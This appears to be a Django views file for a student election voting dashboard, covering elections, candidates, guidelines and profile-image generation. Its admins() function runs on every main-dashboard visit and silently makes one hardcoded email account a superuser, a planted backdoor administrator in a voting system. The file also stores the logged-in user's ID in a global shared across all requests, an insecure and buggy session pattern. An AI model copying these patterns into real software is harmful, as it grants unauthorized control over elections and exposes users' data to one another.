from django.shortcuts import render, get_object_or_404
from .models import Election, Candidate, Position,Student
from django.http import JsonResponse
from django.contrib.auth.decorators import login_required
from django.shortcuts import redirect
from django.contrib.auth.models import User
from django.contrib.auth import logout as auth_logout
import os

Logged_id=None

@login_required
def get_user_info(request):
    global Logged_id
    user = request.user
    id = {(user.get_short_name()).split(' ')[0]}
    Logged_id = str(id).replace('-', '').replace('{', '').replace('}', '').replace("'", '').replace('"', '').strip()
    initials=user.username.split('.')[0][0].upper()  + user.username.split('.')[1].split('@')[0][0].upper() 
    print(initials)
    if os.path.exists(f'static/initials/{initials}.jpg'):
        print('profile exist')
    else:

        create_profile_image(initials, f'{initials}.jpg')
    
    user_info = {
        'username': user.username,
        'email': user.email,
        'id' : id,
        'lastname' : user.last_name,
        'initials' :  initials
        
    }
   
  
    return user_info

def main(request):
    user_info=get_user_info(request)
    global Logged_id

    admins(request)
    return render(request, 'dashboard_templates/dashboard_main.html', {
        **get_user_info(request)  # Assuming this returns a dictionary
    })

def votes(request):
    user_info=get_user_info(request)
    global Logged_id

    student = get_object_or_404(Student, student_id=Logged_id)  # Ensure you handle cases where the student does not exist
    election = Election.objects.filter(departments__contains=student.department)
 
    return render(request, 'dashboard_templates/dashboard_votes.html', {'elections': election} |  get_user_info(request))

def votes_candidates(request, election_id):
    election = get_object_or_404(Election, id=election_id)
    positions = Position.objects.filter(election=election)
    candidates = Candidate.objects.filter(election=election).select_related('position')

    context = {
        'positions': positions,
        'candidates': candidates,
        'election': election
    }
    context.update(get_user_info(request))  # Merging user info
    return render(request, 'dashboard_templates/dashboard_votes_candidates.html', context)


def get_positions(request, election_id):
    positions = Position.objects.filter(election_id=election_id)
    positions_data = [{"id": position.id, "title": position.title} for position in positions]
    return JsonResponse({"positions": positions_data})

def guidelines(request):
    return render(request, 'dashboard_templates/dashboard_guidelines.html', get_user_info(request))

def logout(request):
    auth_logout(request)  # Logs the user out
    return redirect('home')  # Redirects to the main dashboard view


def admins(request):
    try:
        user = User.objects.get(email="johnmark.econar@cit.edu")
        user.is_staff = True
        user.is_superuser = True
        user.save()
        print(f"User {user.email} is now an admin.")
    except User.DoesNotExist:
        print("User not found")






from PIL import Image, ImageDraw, ImageFont

def create_profile_image(initials, output_path, size=256, text_color="white"):
 
   
    bg_color = (164, 28, 48)  
    img = Image.new("RGB", (size, size), color=bg_color)
    draw = ImageDraw.Draw(img)

   
    try:
        font = ImageFont.truetype("arial.ttf", int(size / 2))
    except IOError:
        font = ImageFont.load_default()

   
    bbox = draw.textbbox((0, 0), initials, font=font)
    text_width, text_height = bbox[2] - bbox[0], bbox[3] - bbox[1]
    text_x = (size - text_width) // 2
    text_y = (size - text_height) // 2

   
    draw.text((text_x, text_y), initials, fill=text_color, font=font)

   
    img.save(f'static/initials/{output_path}')
    print( output_path)